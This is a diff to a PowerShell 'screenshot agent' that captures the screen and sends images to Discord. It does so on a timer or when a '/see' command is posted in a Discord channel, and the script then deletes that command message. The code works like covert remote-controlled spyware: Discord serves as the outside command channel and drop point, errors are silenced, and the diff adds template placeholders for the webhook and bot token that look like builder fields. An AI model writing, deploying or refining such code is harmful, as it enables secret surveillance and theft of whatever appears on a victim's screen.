@@ -1,24 +1,17 @@
-# screen.ps1 — discord screenshot agent
-# secrets live in the local config, not in this file:
-#   $env:ProgramData\screenagent.cfg.ps1
+$Config = @{
+    WebhookUrl  = '__WEBHOOK__'
+    BotToken    = '__TOKEN__'
+    ChannelId   = '__CHANNEL__'
+    IntervalSec = 300
+    PollSec     = 3
+}
 
-$CfgPath = Join-Path $env:ProgramData 'screenagent.cfg.ps1'
 $LogPath = Join-Path $env:TEMP 'screenagent.log'
-
 function Log([string]$Message) {
     '{0} {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Message |
         Add-Content -Path $LogPath -ErrorAction SilentlyContinue
 }
-
-if (-not (Test-Path $CfgPath)) {
-    Log "config missing: $CfgPath"
-    exit 1
-}
-
-try { . $CfgPath } catch { Log "config unreadable: $($_.Exception.Message)"; exit 1 }
-if (-not $Config -or -not $Config.WebhookUrl) { Log 'config empty or no WebhookUrl'; exit 1 }
-if (-not $Config.PollSec)     { $Config.PollSec = 3 }
-if (-not $Config.IntervalSec) { $Config.IntervalSec = 300 }
+if (-not $Config.WebhookUrl -or $Config.WebhookUrl -eq '__WEBHOOK__') { Log 'not configured'; exit 1 }
 
 Log "agent start bot=$([bool]$Config.BotToken) channel=$($Config.ChannelId)"
 
@@ -65,14 +58,13 @@ function Send-Screenshot {
     finally { if ($file -and (Test-Path $file)) { Remove-Item $file -Force -ErrorAction SilentlyContinue } }
 }
 
-function Bot-Head { @{ Authorization = "Bot $($Config.BotToken)" } }
-
 function Start-BotLoop {
+    $head = @{ Authorization = "Bot $($Config.BotToken)" }
     $lastSeen = $null
     while ($true) {
         try {
             $uri = "https://discord.com/api/v10/channels/$($Config.ChannelId)/messages?limit=1"
-            $msgs = Invoke-RestMethod -Uri $uri -Headers (Bot-Head) -ErrorAction Stop
+            $msgs = Invoke-RestMethod -Uri $uri -Headers $head -ErrorAction Stop
             $m = @($msgs) | Select-Object -First 1
             if ($m -and $m.id -ne $lastSeen -and -not $m.author.bot -and $m.content -and ($m.content -match '^\s*/see\s*$')) {
                 $lastSeen = $m.id
@@ -81,7 +73,7 @@ function Start-BotLoop {
                 try {
                     Invoke-RestMethod -Method Delete `
                         -Uri "https://discord.com/api/v10/channels/$($Config.ChannelId)/messages/$($m.id)" `
-                        -Headers (Bot-Head) -ErrorAction Stop | Out-Null
+                        -Headers $head -ErrorAction Stop | Out-Null
                 }
                 catch { Log "delete failed: $($_.Exception.Message)" }
             }
@@ -98,4 +90,4 @@ function Start-IntervalLoop {
     }
 }
 
-if ($Config.BotToken -and $Config.ChannelId) { Start-BotLoop } else { Start-IntervalLoop }
+if ($Config.BotToken -and $Config.BotToken -ne '__TOKEN__' -and $Config.ChannelId) { Start-BotLoop } else { Start-IntervalLoop }
